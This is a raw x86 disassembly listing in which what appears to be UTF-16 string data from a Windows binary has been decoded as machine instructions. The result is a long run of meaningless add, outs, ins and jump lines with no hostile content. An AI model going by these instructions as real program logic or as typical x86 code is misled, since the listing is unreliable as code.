  4064b7:	add    BYTE PTR [ebx+0x0],ah
  4064ba:	add    BYTE PTR gs:[ebx+0x0],dh
  4064be:	jae    0x4064c0
  4064c0:	and    BYTE PTR [eax],al
  4064c2:	imul   eax,DWORD PTR [eax],0x20006e
  4064c8:	jae    0x4064ca
  4064ca:	je     0x4064cc
  4064cc:	popa   
  4064cd:	add    BYTE PTR [esi+0x0],ch
  4064d0:	add    BYTE PTR fs:[ecx+0x0],ah
  4064d4:	ins    BYTE PTR es:[edi],dx
  4064d5:	add    BYTE PTR [edi+0x0],ch
  4064d8:	outs   dx,BYTE PTR ds:[esi]
  4064d9:	add    BYTE PTR [ebp+0x0],ah
  4064dc:	and    BYTE PTR [eax],al
  4064de:	ins    DWORD PTR es:[edi],dx
  4064df:	add    BYTE PTR [edi+0x0],ch
  4064e2:	add    BYTE PTR fs:[ebp+0x0],ah
  4064e6:	add    BYTE PTR [ecx],dh
  4064e8:	push   eax
  4064e9:	add    BYTE PTR [edx+0x0],dh
  4064ec:	add    BYTE PTR gs:[ebx+0x0],dh
  4064f0:	jae    0x4064f2
  4064f2:	and    BYTE PTR [eax],al
  4064f4:	inc    ebx
  4064f5:	add    BYTE PTR [eax+eax*1+0x72],dh
  4064f9:	add    BYTE PTR [eax+eax*1+0x2b],ch
  4064fd:	add    BYTE PTR [ebx+0x0],al
  406500:	and    BYTE PTR [eax],al
  406502:	je     0x406504
  406504:	outs   dx,DWORD PTR ds:[esi]
  406505:	add    BYTE PTR [eax],ah
  406507:	add    BYTE PTR [ebp+0x0],ah
  40650a:	js     0x40650c
  40650c:	imul   eax,DWORD PTR [eax],0x2e0074
  406512:	add    BYTE PTR cs:[esi],ch
  406515:	add    BYTE PTR [esi],ch
  406517:	add    BYTE PTR [eax],al
  406519:	dec    ecx
  40651a:	dec    eax
  40651b:	add    BYTE PTR [ecx+0x0],ah
  40651e:	outs   dx,BYTE PTR ds:[esi]
  40651f:	add    BYTE PTR [eax+eax*1+0x6c],ah
  406523:	add    BYTE PTR [ebp+0x0],ah
  406526:	add    BYTE PTR fs:[eax],ah
  406529:	add    BYTE PTR [ebx+0x0],al
  40652c:	outs   dx,DWORD PTR ds:[esi]
  40652d:	add    BYTE PTR [esi+0x0],ch
  406530:	jae    0x406532
  406532:	outs   dx,DWORD PTR ds:[esi]
  406533:	add    BYTE PTR [eax+eax*1+0x65],ch
  406537:	add    BYTE PTR [ebx+0x0],al
  40653a:	popa   
  40653b:	add    BYTE PTR [esi+0x0],ch
  40653e:	arpl   WORD PTR [eax],ax
  406540:	add    BYTE PTR gs:[eax+eax*1+0x4b],ch
  406545:	add    BYTE PTR [ebp+0x0],ah
  406548:	jns    0x40654a
  40654a:	push   eax
  40654b:	add    BYTE PTR [edx+0x0],dh
  40654e:	add    BYTE PTR gs:[ebx+0x0],dh
  406552:	jae    0x406554
  406554:	and    BYTE PTR [eax],al
  406556:	add    BYTE PTR gs:[esi+0x0],dh
  40655a:	add    BYTE PTR gs:[esi+0x0],ch
  40655e:	je     0x406560
  406560:	add    BYTE PTR cs:[eax],al
  406563:	jge    0x4065b7
  406565:	add    BYTE PTR [ebp+0x0],ah
  406568:	arpl   WORD PTR [eax],ax
  40656a:	add    BYTE PTR gs:[ecx+0x0],ch
  40656e:	jbe    0x406570
  406570:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  406575:	add    BYTE PTR [ebp+0x0],ah
  406578:	jb     0x40657a
  40657a:	jb     0x40657c
  40657c:	outs   dx,DWORD PTR ds:[esi]
  40657d:	add    BYTE PTR [edx+0x0],dh
  406580:	and    BYTE PTR [eax],al
  406582:	data16 add BYTE PTR [edx+0x0],dh
  406586:	outs   dx,DWORD PTR ds:[esi]
  406587:	add    BYTE PTR [ebp+0x0],ch
  40658a:	and    BYTE PTR [eax],al
  40658c:	dec    ebp
  40658d:	add    BYTE PTR [ebp+0x0],ah
  406590:	add    BYTE PTR fs:[ecx+0x0],ch
  406594:	popa   
  406595:	add    BYTE PTR [esi+0x0],al
  406598:	outs   dx,DWORD PTR ds:[esi]
  406599:	add    BYTE PTR [ebp+0x0],dh
  40659c:	outs   dx,BYTE PTR ds:[esi]
  40659d:	add    BYTE PTR [eax+eax*1+0x61],ah
  4065a1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4065a5:	add    BYTE PTR [edi+0x0],ch
  4065a8:	outs   dx,BYTE PTR ds:[esi]
  4065a9:	add    BYTE PTR [eax],ah
  4065ab:	add    BYTE PTR [edx+0x0],dh
  4065ae:	add    BYTE PTR gs:[ebx+0x0],ah
  4065b2:	outs   dx,DWORD PTR ds:[esi]
  4065b3:	add    BYTE PTR [edx+0x0],dh
  4065b6:	add    BYTE PTR fs:[ebp+0x0],ah
  4065ba:	jb     0x4065bc
  4065bc:	cmp    al,BYTE PTR [eax]
  4065be:	and    BYTE PTR [eax],al
  4065c0:	dec    eax
  4065c1:	add    BYTE PTR [edx+0x0],dl
  4065c4:	inc    ebp
  4065c5:	add    BYTE PTR [ebx+0x0],dl
  4065c8:	push   ebp
  4065c9:	add    BYTE PTR [eax+eax*1+0x54],cl
  4065cd:	add    BYTE PTR [edx],bh
  4065cf:	add    BYTE PTR [eax],ah
  4065d1:	add    BYTE PTR [eax],dh
  4065d3:	add    BYTE PTR [eax+0x0],bh
  4065d6:	jnp    0x4065d8
  4065d8:	xor    BYTE PTR [eax],al
  4065da:	cmp    al,BYTE PTR [eax]
  4065dc:	pop    eax
  4065dd:	add    BYTE PTR [ebp+0x0],bh
  4065e0:	add    BYTE PTR [ecx+0x45],dh
  4065e3:	add    BYTE PTR [edx+0x0],dh
  4065e6:	jb     0x4065e8
  4065e8:	outs   dx,DWORD PTR ds:[esi]
  4065e9:	add    BYTE PTR [edx+0x0],dh
  4065ec:	and    BYTE PTR [eax],al
  4065ee:	outs   dx,DWORD PTR ds:[esi]
  4065ef:	add    BYTE PTR [ebx+0x0],ah
  4065f2:	arpl   WORD PTR [eax],ax
  4065f4:	jne    0x4065f6
  4065f6:	jb     0x4065f8
  4065f8:	jb     0x4065fa
  4065fa:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4065ff:	add    BYTE PTR [eax+eax*1+0x75],ah
  406603:	add    BYTE PTR [edx+0x0],dh
  406606:	imul   eax,DWORD PTR [eax],0x67006e
  40660c:	and    BYTE PTR [eax],al
  40660e:	jb     0x406610
  406610:	add    BYTE PTR gs:[ebx+0x0],ah
  406614:	outs   dx,DWORD PTR ds:[esi]
  406615:	add    BYTE PTR [edx+0x0],dh
  406618:	add    BYTE PTR fs:[ebp+0x0],ah
  40661c:	jb     0x40661e
  40661e:	and    BYTE PTR [eax],al
  406620:	jae    0x406622
  406622:	add    BYTE PTR gs:[ebx+0x0],dh
  406626:	jae    0x406628
  406628:	imul   eax,DWORD PTR [eax],0x6e006f
  40662e:	add    BYTE PTR cs:[eax],ah
  406631:	add    BYTE PTR [eax+0x0],cl
  406634:	push   edx
  406635:	add    BYTE PTR [ebp+0x0],al
  406638:	push   ebx
  406639:	add    BYTE PTR [ebp+0x0],dl
  40663c:	dec    esp
  40663d:	add    BYTE PTR [eax+eax*1+0x3a],dl
  406641:	add    BYTE PTR [eax],ah
  406643:	add    BYTE PTR [eax],dh
  406645:	add    BYTE PTR [eax+0x0],bh
  406648:	jnp    0x40664a
  40664a:	xor    BYTE PTR [eax],al
  40664c:	cmp    al,BYTE PTR [eax]
  40664e:	pop    eax
  40664f:	add    BYTE PTR [ebp+0x0],bh
  406652:	add    BYTE PTR [edi+0x43],bl
  406655:	add    BYTE PTR [edi+0x0],ch
  406658:	jne    0x40665a
  40665a:	ins    BYTE PTR es:[edi],dx
  40665b:	add    BYTE PTR [eax+eax*1+0x20],ah
  40665f:	add    BYTE PTR [esi+0x0],ch
  406662:	outs   dx,DWORD PTR ds:[esi]
  406663:	add    BYTE PTR [eax+eax*1+0x20],dh
  406667:	add    BYTE PTR [eax+0x0],dh
  40666a:	jne    0x40666c
  40666c:	bound  eax,QWORD PTR [eax]
  40666e:	ins    BYTE PTR es:[edi],dx
  40666f:	add    BYTE PTR [ecx+0x0],ch
  406672:	jae    0x406674
  406674:	push   0x65002000
  406679:	add    BYTE PTR [edx+0x0],dh
  40667c:	jb     0x40667e
  40667e:	outs   dx,DWORD PTR ds:[esi]
  40667f:	add    BYTE PTR [edx+0x0],dh
  406682:	and    BYTE PTR [eax],al
  406684:	imul   eax,DWORD PTR [eax],0x66006e
  40668a:	outs   dx,DWORD PTR ds:[esi]
  40668b:	add    BYTE PTR [eax],ah
  40668d:	add    BYTE PTR [ebx+0x0],bh
  406690:	xor    BYTE PTR [eax],al
  406692:	jge    0x406694
  406694:	and    BYTE PTR [eax],al
  406696:	je     0x406698
  406698:	outs   dx,DWORD PTR ds:[esi]
  406699:	add    BYTE PTR [eax],ah
  40669b:	add    BYTE PTR [ebx+0x0],ah
  40669e:	push   0x6e006100
  4066a3:	add    BYTE PTR [esi+0x0],ch
  4066a6:	add    BYTE PTR gs:[eax+eax*1+0x20],ch
  4066ab:	add    BYTE PTR [ebx+0x0],bh
  4066ae:	xor    DWORD PTR [eax],eax
  4066b0:	jge    0x4066b2
  4066b2:	add    BYTE PTR [ebx],ah
  4066b4:	push   ebx
  4066b5:	add    BYTE PTR [ebx+0x0],ah
  4066b8:	jb     0x4066ba
  4066ba:	add    BYTE PTR gs:[ebp+0x0],ah
  4066be:	outs   dx,BYTE PTR ds:[esi]
  4066bf:	add    BYTE PTR [ebx+0x0],al
  4066c2:	popa   
  4066c3:	add    BYTE PTR [eax+0x0],dh
  4066c6:	je     0x4066c8
  4066c8:	jne    0x4066ca
  4066ca:	jb     0x4066cc
  4066cc:	add    BYTE PTR gs:[esi],ch
  4066cf:	add    BYTE PTR [edi+0x0],dh
  4066d2:	ins    DWORD PTR es:[edi],dx
  4066d3:	add    BYTE PTR [esi+0x0],dh
  4066d6:	add    BYTE PTR [ecx],ah
  4066d8:	sub    eax,0x61007000
  4066dd:	add    BYTE PTR [edx+0x0],dh
  4066e0:	add    BYTE PTR gs:[esi+0x0],ch
  4066e4:	je     0x4066e6
  4066e6:	jo     0x4066e8
  4066e8:	jb     0x4066ea
  4066ea:	outs   dx,DWORD PTR ds:[esi]
  4066eb:	add    BYTE PTR [ebx+0x0],ah
  4066ee:	add    BYTE PTR gs:[ebx+0x0],dh
  4066f2:	jae    0x4066f4
  4066f4:	imul   eax,DWORD PTR [eax],0x3b010064
  4066fa:	dec    ecx
  4066fb:	add    BYTE PTR [esi+0x0],ch
  4066fe:	jbe    0x406700
  406700:	popa   
  406701:	add    BYTE PTR [eax+eax*1+0x69],ch
  406705:	add    BYTE PTR [eax+eax*1+0x20],ah
  406709:	add    BYTE PTR [eax+0x0],dl
  40670c:	popa   
  40670d:	add    BYTE PTR [edx+0x0],dh
  406710:	add    BYTE PTR gs:[esi+0x0],ch
  406714:	je     0x406716
  406716:	and    BYTE PTR [eax],al
  406718:	push   eax
  406719:	add    BYTE PTR [edx+0x0],dh
  40671c:	outs   dx,DWORD PTR ds:[esi]
  40671d:	add    BYTE PTR [ebx+0x0],ah
  406720:	add    BYTE PTR gs:[ebx+0x0],dh
  406724:	jae    0x406726
  406726:	and    BYTE PTR [eax],al
  406728:	dec    ecx
  406729:	add    BYTE PTR [eax+eax*1+0x20],ah
  40672d:	add    BYTE PTR [ebx+0x0],bh
  406730:	xor    BYTE PTR [eax],al
  406732:	jge    0x406734
  406734:	add    BYTE PTR [ecx],ah
  406736:	sub    eax,0x68006300
  40673b:	add    BYTE PTR [ecx+0x0],ah
  40673e:	outs   dx,BYTE PTR ds:[esi]
  40673f:	add    BYTE PTR [esi+0x0],ch
  406742:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  406747:	add    BYTE PTR [edi+0x0],ch
  40674a:	jb     0x40674c
  40674c:	je     0x40674e
  40674e:	outs   dx,BYTE PTR ds:[esi]
  40674f:	add    BYTE PTR [ecx+0x0],ah
  406752:	ins    DWORD PTR es:[edi],dx
  406753:	add    BYTE PTR [ebp+0x0],ah
  406756:	add    DWORD PTR [ecx],edi
  406758:	dec    ecx
  406759:	add    BYTE PTR [esi+0x0],ch
  40675c:	jbe    0x40675e
  40675e:	popa   
  40675f:	add    BYTE PTR [eax+eax*1+0x69],ch
  406763:	add    BYTE PTR [eax+eax*1+0x20],ah
  406767:	add    BYTE PTR [ebx+0x0],al
  40676a:	push   0x6e006100
  40676f:	add    BYTE PTR [esi+0x0],ch
  406772:	add    BYTE PTR gs:[eax+eax*1+0x20],ch
  406777:	add    BYTE PTR [eax+0x0],dl
  40677a:	outs   dx,DWORD PTR ds:[esi]
  40677b:	add    BYTE PTR [edx+0x0],dh
  40677e:	je     0x406780
  406780:	dec    esi
  406781:	add    BYTE PTR [ecx+0x0],ah
  406784:	ins    DWORD PTR es:[edi],dx
  406785:	add    BYTE PTR [ebp+0x0],ah
  406788:	and    BYTE PTR [eax],al
  40678a:	jnp    0x40678c
  40678c:	xor    BYTE PTR [eax],al
  40678e:	jge    0x406790
  406790:	add    BYTE PTR ds:0x72002d,ah
  406796:	add    BYTE PTR gs:[ebx+0x0],ah
  40679a:	outs   dx,DWORD PTR ds:[esi]
  40679b:	add    BYTE PTR [edx+0x0],dh
  40679e:	add    BYTE PTR fs:[ebp+0x0],ah
  4067a2:	jb     0x4067a4
  4067a4:	inc    ebp
  4067a5:	add    BYTE PTR [esi+0x0],dh
  4067a8:	add    BYTE PTR gs:[esi+0x0],ch
  4067ac:	je     0x4067ae
  4067ae:	dec    esi
  4067af:	add    BYTE PTR [ecx+0x0],ah
  4067b2:	ins    DWORD PTR es:[edi],dx
  4067b3:	add    BYTE PTR [ebp+0x0],ah
  4067b6:	add    DWORD PTR ds:0x6e0049,edi
  4067bc:	jbe    0x4067be
  4067be:	popa   
  4067bf:	add    BYTE PTR [eax+eax*1+0x69],ch
  4067c3:	add    BYTE PTR [eax+eax*1+0x20],ah
  4067c7:	add    BYTE PTR [edx+0x0],dl
  4067ca:	add    BYTE PTR gs:[ebx+0x0],ah
  4067ce:	outs   dx,DWORD PTR ds:[esi]
  4067cf:	add    BYTE PTR [edx+0x0],dh
  4067d2:	add    BYTE PTR fs:[ebp+0x0],ah
  4067d6:	jb     0x4067d8
  4067d8:	and    BYTE PTR [eax],al
  4067da:	inc    ebp
  4067db:	add    BYTE PTR [esi+0x0],dh
  4067de:	add    BYTE PTR gs:[esi+0x0],ch
  4067e2:	je     0x4067e4
  4067e4:	dec    esi
  4067e5:	add    BYTE PTR [ecx+0x0],ah
  4067e8:	ins    DWORD PTR es:[edi],dx
  4067e9:	add    BYTE PTR [ebp+0x0],ah
  4067ec:	and    BYTE PTR [eax],al
  4067ee:	jnp    0x4067f0
  4067f0:	xor    BYTE PTR [eax],al
  4067f2:	jge    0x4067f4
  4067f4:	add    BYTE PTR ds:0x3f002d,al
  4067fa:	add    DWORD PTR ds:0x3f002f,eax
  406800:	add    BYTE PTR [ecx],dl
  406802:	sub    eax,0x6f006e00
  406807:	add    BYTE PTR [ecx+0x0],ah
  40680a:	jne    0x40680c
  40680c:	add    BYTE PTR fs:[ecx+0x0],ch
  406810:	outs   dx,DWORD PTR ds:[esi]
  406811:	add    BYTE PTR [ecx],al
  406813:	adc    DWORD PTR ds:0x6f006e00,ebp
  406819:	add    BYTE PTR [esi+0x0],dh
  40681c:	imul   eax,DWORD PTR [eax],0x650064
  406822:	outs   dx,DWORD PTR ds:[esi]
  406823:	add    BYTE PTR [ecx],al
  406825:	pop    ds
  406826:	sub    eax,0x75006f00
  40682b:	add    BYTE PTR [eax+eax*1+0x70],dh
  40682f:	add    BYTE PTR [ebp+0x0],dh
  406832:	je     0x406834
  406834:	data16 add BYTE PTR [ecx+0x0],ch
  406838:	ins    BYTE PTR es:[edi],dx
  406839:	add    BYTE PTR [ebp+0x0],ah
  40683c:	outs   dx,BYTE PTR ds:[esi]
  40683d:	add    BYTE PTR [ecx+0x0],ah
  406840:	ins    DWORD PTR es:[edi],dx
  406841:	add    BYTE PTR [ebp+0x0],ah
  406844:	add    DWORD PTR [ebp+0x4e],ebp
  406847:	add    BYTE PTR [edi+0x0],ch
  40684a:	and    BYTE PTR [eax],al
  40684c:	inc    esi
  40684d:	add    BYTE PTR [ecx+0x0],ch
  406850:	ins    BYTE PTR es:[edi],dx
  406851:	add    BYTE PTR [ebp+0x0],ah
  406854:	dec    esi
  406855:	add    BYTE PTR [ecx+0x0],ah
  406858:	ins    DWORD PTR es:[edi],dx
  406859:	add    BYTE PTR [ebp+0x0],ah
  40685c:	and    BYTE PTR [eax],al
  40685e:	jae    0x406860
  406860:	jo     0x406862
  406862:	add    BYTE PTR gs:[ebx+0x0],ah
  406866:	imul   eax,DWORD PTR [eax],0x690066
  40686c:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  406871:	add    BYTE PTR [esi+0x0],ah
  406874:	outs   dx,DWORD PTR ds:[esi]
  406875:	add    BYTE PTR [edx+0x0],dh
  406878:	and    BYTE PTR [eax],al
  40687a:	je     0x40687c
  40687c:	push   0x20006500
  406881:	add    BYTE PTR [edi+0x0],ch
  406884:	jne    0x406886
  406886:	je     0x406888
  406888:	jo     0x40688a
  40688a:	jne    0x40688c
  40688c:	je     0x40688e
  40688e:	data16 add BYTE PTR [ecx+0x0],ch
  406892:	ins    BYTE PTR es:[edi],dx
  406893:	add    BYTE PTR [ebp+0x0],ah
  406896:	outs   dx,BYTE PTR ds:[esi]
  406897:	add    BYTE PTR [ecx+0x0],ah
  40689a:	ins    DWORD PTR es:[edi],dx
  40689b:	add    BYTE PTR [ebp+0x0],ah
  40689e:	and    BYTE PTR [eax],al
  4068a0:	jo     0x4068a2
  4068a2:	popa   
  4068a3:	add    BYTE PTR [edx+0x0],dh
  4068a6:	popa   
  4068a7:	add    BYTE PTR [ebp+0x0],ch
  4068aa:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4068af:	add    BYTE PTR [edx+0x0],dh
  4068b2:	add    BYTE PTR [ecx],dl
  4068b4:	sub    eax,0x69006200
  4068b9:	add    BYTE PTR [eax+eax*1+0x72],dh
  4068bd:	add    BYTE PTR [ecx+0x0],ah
  4068c0:	je     0x4068c2
  4068c2:	add    BYTE PTR gs:[ecx],al
  4068c5:	cmovb  eax,DWORD PTR [eax]
  4068c8:	imul   eax,DWORD PTR [eax],0x520074
  4068ce:	popa   
  4068cf:	add    BYTE PTR [eax+eax*1+0x65],dh
  4068d3:	add    BYTE PTR [eax],al
  4068d5:	adc    eax,0x66002d
  4068da:	jb     0x4068dc
  4068dc:	popa   
  4068dd:	add    BYTE PTR [ebp+0x0],ch
  4068e0:	add    BYTE PTR gs:[edx+0x0],dh
  4068e4:	popa   
  4068e5:	add    BYTE PTR [eax+eax*1+0x65],dh
  4068e9:	add    BYTE PTR [ecx],al
  4068eb:	adc    eax,DWORD PTR [esi+0x0]
  4068ee:	jb     0x4068f0
  4068f0:	popa   
  4068f1:	add    BYTE PTR [ebp+0x0],ch
  4068f4:	add    BYTE PTR gs:[edx+0x0],dl
  4068f8:	popa   
  4068f9:	add    BYTE PTR [eax+eax*1+0x65],dh
  4068fd:	add    BYTE PTR [eax],al
  4068ff:	adc    ebp,DWORD PTR ds:0x75006400
  406905:	add    BYTE PTR [edx+0x0],dh
  406908:	popa   
  406909:	add    BYTE PTR [eax+eax*1+0x69],dh
  40690d:	add    BYTE PTR [edi+0x0],ch
  406910:	outs   dx,BYTE PTR ds:[esi]
  406911:	add    BYTE PTR [ecx],al
  406913:	adc    DWORD PTR [eax+eax*1+0x75],eax
  406917:	add    BYTE PTR [edx+0x0],dh
  40691a:	popa   
  40691b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40691f:	add    BYTE PTR [edi+0x0],ch
  406922:	outs   dx,BYTE PTR ds:[esi]
  406923:	add    BYTE PTR [eax],al
  406925:	pop    ss
  406926:	push   edx
  406927:	add    BYTE PTR [ebp+0x0],ah
  40692a:	arpl   WORD PTR [eax],ax
  40692c:	outs   dx,DWORD PTR ds:[esi]
  40692d:	add    BYTE PTR [edx+0x0],dh
  406930:	add    BYTE PTR fs:[ecx+0x0],al
  406934:	jne    0x406936
  406936:	add    BYTE PTR fs:[ecx+0x0],ch
  40693a:	outs   dx,DWORD PTR ds:[esi]
  40693b:	add    BYTE PTR [eax],al
  40693d:	adc    eax,0x30007b
  406942:	jge    0x406944
  406944:	and    BYTE PTR [eax],al
  406946:	and    BYTE PTR [eax],al
  406948:	cmp    al,BYTE PTR [eax]
  40694a:	and    BYTE PTR [eax],al
  40694c:	jnp    0x40694e
  40694e:	xor    DWORD PTR [eax],eax
  406950:	jge    0x406952
  406952:	add    BYTE PTR [edi],dl
  406954:	dec    ecx
  406955:	add    BYTE PTR [esi+0x0],ch
  406958:	jbe    0x40695a
  40695a:	popa   
  40695b:	add    BYTE PTR [eax+eax*1+0x69],ch
  40695f:	add    BYTE PTR [eax+eax*1+0x20],ah
  406963:	add    BYTE PTR [ebx+0x0],bh
  406966:	xor    BYTE PTR [eax],al
  406968:	jge    0x40696a
  40696a:	add    BYTE PTR [ecx],ah
  40696c:	inc    edi
  40696d:	add    BYTE PTR [ebp+0x0],ah
  406970:	je     0x406972
  406972:	inc    ebp
  406973:	add    BYTE PTR [edx+0x0],dh
  406976:	jb     0x406978
  406978:	outs   dx,DWORD PTR ds:[esi]
  406979:	add    BYTE PTR [edx+0x0],dh
  40697c:	inc    ebx
  40697d:	add    BYTE PTR [ecx+0x0],ah
  406980:	ins    BYTE PTR es:[edi],dx
  406981:	add    BYTE PTR [eax+eax*1+0x62],ch
  406985:	add    BYTE PTR [ecx+0x0],ah
  406988:	arpl   WORD PTR [eax],ax
  40698a:	imul   eax,DWORD PTR [eax],0x0
  40698d:	add    BYTE PTR [ebx+0x69004d],0x63
  406994:	add    BYTE PTR [edx+0x0],dh
  406997:	outs   dx,DWORD PTR ds:[esi]
  406998:	add    BYTE PTR [ebx+0x0],dh
  40699b:	outs   dx,DWORD PTR ds:[esi]
  40699c:	add    BYTE PTR [esi+0x0],ah
  40699f:	je     0x4069a1
  4069a1:	add    BYTE PTR cs:[esi+0x0],dl
  4069a5:	imul   eax,DWORD PTR [eax],0x750073
  4069ab:	popa   
  4069ac:	add    BYTE PTR [eax+eax*1+0x53],ch
  4069b0:	add    BYTE PTR [eax+eax*1+0x75],dh
  4069b4:	add    BYTE PTR [eax+eax*1+0x69],ah
  4069b8:	add    BYTE PTR [edi+0x0],ch
  4069bb:	add    BYTE PTR cs:[eax+eax*1+0x65],dl
  4069c0:	add    BYTE PTR [ebx+0x0],dh
  4069c3:	je     0x4069c5
  4069c5:	push   esp
  4069c6:	add    BYTE PTR [edi+0x0],ch
  4069c9:	outs   dx,DWORD PTR ds:[esi]
  4069ca:	add    BYTE PTR [eax+eax*1+0x73],ch
  4069ce:	add    BYTE PTR [esi],ch
  4069d0:	add    BYTE PTR [ebp+0x0],cl
  4069d3:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  4069d8:	add    BYTE PTR [ecx+0x0],ah
  4069db:	inc    esi
  4069dc:	add    BYTE PTR [edi+0x0],ch
  4069df:	jne    0x4069e1
  4069e1:	outs   dx,BYTE PTR ds:[esi]
  4069e2:	add    BYTE PTR [eax+eax*1+0x61],ah
  4069e6:	add    BYTE PTR [eax+eax*1+0x69],dh
  4069ea:	add    BYTE PTR [edi+0x0],ch
  4069ed:	outs   dx,BYTE PTR ds:[esi]
  4069ee:	add    BYTE PTR [edx+0x0],dl
  4069f1:	add    BYTE PTR gs:[ebx+0x0],ah
  4069f5:	outs   dx,DWORD PTR ds:[esi]
  4069f6:	add    BYTE PTR [edx+0x0],dh
  4069f9:	add    BYTE PTR fs:[ebp+0x0],ah
  4069fd:	jb     0x4069ff
  4069ff:	add    BYTE PTR cs:[edx+0x0],dl
  406a03:	add    BYTE PTR gs:[ebx+0x0],dh
  406a07:	outs   dx,DWORD PTR ds:[esi]
  406a08:	add    BYTE PTR [ebp+0x0],dh
  406a0b:	jb     0x406a0d
  406a0d:	arpl   WORD PTR [eax],ax
  406a0f:	add    BYTE PTR gs:[eax],al
  406a12:	and    DWORD PTR [ecx+0x0],eax
  406a15:	jne    0x406a17
  406a17:	add    BYTE PTR fs:[ecx+0x0],ch
  406a1b:	outs   dx,DWORD PTR ds:[esi]
  406a1c:	add    BYTE PTR [eax+eax*1+0x65],al
  406a20:	add    BYTE PTR [esi+0x0],dh
  406a23:	imul   eax,DWORD PTR [eax],0x650063
  406a29:	inc    ebp
  406a2a:	add    BYTE PTR [edx+0x0],dh
  406a2d:	jb     0x406a2f
  406a2f:	outs   dx,DWORD PTR ds:[esi]
  406a30:	add    BYTE PTR [edx+0x0],dh
  406a33:	add    BYTE PTR [edi],bl
  406a35:	inc    ebx
  406a36:	add    BYTE PTR [edi+0x0],ch
  406a39:	jo     0x406a3b
  406a3b:	jns    0x406a3d
  406a3d:	jb     0x406a3f
  406a3f:	imul   eax,DWORD PTR [eax],0x680067
  406a45:	je     0x406a47
  406a47:	push   ebx
  406a48:	add    BYTE PTR [eax+eax*1+0x72],dh
  406a4c:	add    BYTE PTR [ecx+0x0],ch
  406a4f:	outs   dx,BYTE PTR ds:[esi]
  406a50:	add    BYTE PTR [edi+0x0],ah
  406a53:	add    BYTE PTR ds:0x610050,dl
  406a59:	jne    0x406a5b
  406a5b:	jae    0x406a5d
  406a5d:	add    BYTE PTR gs:[ebp+0x0],al
  406a61:	jb     0x406a63
  406a63:	jb     0x406a65
  406a65:	outs   dx,DWORD PTR ds:[esi]
  406a66:	add    BYTE PTR [edx+0x0],dh
  406a69:	add    BYTE PTR [edi],dl
  406a6b:	push   edx
  406a6c:	add    BYTE PTR [ebp+0x0],ah
  406a6f:	jae    0x406a71
  406a71:	jne    0x406a73
  406a73:	ins    DWORD PTR es:[edi],dx
  406a74:	add    BYTE PTR [ebp+0x0],ah
  406a77:	inc    ebp
  406a78:	add    BYTE PTR [edx+0x0],dh
  406a7b:	jb     0x406a7d
  406a7d:	outs   dx,DWORD PTR ds:[esi]
  406a7e:	add    BYTE PTR [edx+0x0],dh
  406a81:	add    BYTE PTR ds:0x740053,dl
  406a87:	popa   
  406a88:	add    BYTE PTR [edx+0x0],dh
  406a8b:	je     0x406a8d
  406a8d:	inc    ebp
  406a8e:	add    BYTE PTR [edx+0x0],dh
  406a91:	jb     0x406a93
  406a93:	outs   dx,DWORD PTR ds:[esi]
  406a94:	add    BYTE PTR [edx+0x0],dh
  406a97:	add    BYTE PTR [ebx],dl
  406a99:	push   ebx
  406a9a:	add    BYTE PTR [eax+eax*1+0x6f],dh
  406a9e:	add    BYTE PTR [eax+0x0],dh
  406aa1:	inc    ebp
  406aa2:	add    BYTE PTR [edx+0x0],dh
  406aa5:	jb     0x406aa7
  406aa7:	outs   dx,DWORD PTR ds:[esi]
  406aa8:	add    BYTE PTR [edx+0x0],dh
  406aab:	add    BYTE PTR [edi],dl
  406aad:	push   ebp
  406aae:	add    BYTE PTR [ebx+0x0],dh
  406ab1:	popa   
  406ab2:	add    BYTE PTR [edi+0x0],ah
  406ab5:	add    BYTE PTR gs:[ebx+0x0],dl
  406ab9:	je     0x406abb
  406abb:	jb     0x406abd
  406abd:	imul   eax,DWORD PTR [eax],0x67006e
  406ac3:	add    BYTE PTR [eax],bl
  406ac5:	pop    ecx
  406ac6:	arpl   WORD PTR [esi-0x1a],dx
  406ac9:	adc    DWORD PTR [ecx+0x48],esp
  406acc:	mov    edx,0x24db1dd1
  406ad1:	mov    ecx,0x8004892
  406ad6:	mov    bh,0x7a
  406ad8:	pop    esp
  406ad9:	push   esi
  406ada:	sbb    DWORD PTR [eax+eiz*8],esi
  406add:	mov    DWORD PTR [eax],ecx
  406adf:	and    BYTE PTR ds:0x2080801,al
  406ae5:	add    cl,BYTE PTR [esi]
  406ae7:	add    esp,DWORD PTR [eax]
  406ae9:	add    BYTE PTR [ecx],al
  406aeb:	push   es
  406aec:	and    BYTE PTR [edx],al
  406aee:	add    DWORD PTR [esi],ecx
  406af0:	adc    cl,BYTE PTR [eax]
  406af2:	pop    es
  406af3:	and    BYTE PTR [ebx],al
  406af5:	add    DWORD PTR [esi],ecx
  406af7:	adc    cl,BYTE PTR [eax]
  406af9:	or     BYTE PTR ds:0x1d010100,al
  406aff:	push   cs
  406b00:	push   es
  406b01:	add    BYTE PTR [edx],al
  406b03:	add    DWORD PTR [edx+edx*1],ebx
  406b06:	adc    DWORD PTR [edx],eax
  406b08:	push   es
  406b09:	push   cs
  406b0a:	sbb    ch,BYTE PTR [ecx+0x0]
  406b0d:	jo     0x406b0f
  406b0f:	arpl   WORD PTR [eax],ax
  406b11:	cmp    al,BYTE PTR [eax]
  406b13:	das    
  406b14:	add    BYTE PTR [edi],ch
  406b16:	add    BYTE PTR [ebx+0x0],bh
  406b19:	xor    BYTE PTR [eax],al
  406b1b:	jge    0x406b1d
  406b1d:	das    
  406b1e:	add    BYTE PTR [ebx+0x0],bh
  406b21:	xor    DWORD PTR [eax],eax
  406b23:	jge    0x406b25
  406b25:	add    eax,0x1d010120
  406b2a:	push   cs
  406b2b:	add    al,0x20
  406b2d:	add    BYTE PTR [edx],dl
  406b2f:	adc    eax,0x1022006
  406b34:	sbb    al,0x12
  406b36:	sbb    DWORD PTR [esi],eax
  406b38:	and    BYTE PTR [edx],al
  406b3a:	add    DWORD PTR [edx+edx*1],ebx
  406b3d:	sbb    eax,0x1c002003
  406b42:	add    al,0x20
  406b44:	add    DWORD PTR [ecx],eax
  406b46:	or     BYTE PTR [ebx],al
  406b48:	push   es
  406b49:	adc    bl,BYTE PTR [eax]
  406b4b:	add    eax,DWORD PTR [esi]
